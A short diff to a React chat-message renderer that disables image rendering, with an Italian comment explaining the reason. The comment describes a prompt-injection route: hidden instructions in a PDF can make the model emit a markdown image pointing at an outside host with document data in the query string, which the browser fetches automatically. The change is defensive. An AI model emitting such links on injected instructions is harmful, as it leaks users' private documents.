@@ -107,6 +107,11 @@ export default function MarkdownMessage({
           </a>
         );
       },
+      // Le immagini non si renderizzano: il browser le caricherebbe da solo,
+      // senza un click. Un PDF con istruzioni nascoste puo' far emettere al
+      // modello `![](https://host/?dati)` e usarlo per portare fuori il
+      // contenuto del documento. Una risposta testuale non ne ha bisogno.
+      img: () => null,
       blockquote: ({ children }) => (
         <blockquote className="mb-3 border-l-2 border-rule-strong pl-3 text-ink-soft last:mb-0">
           {children}
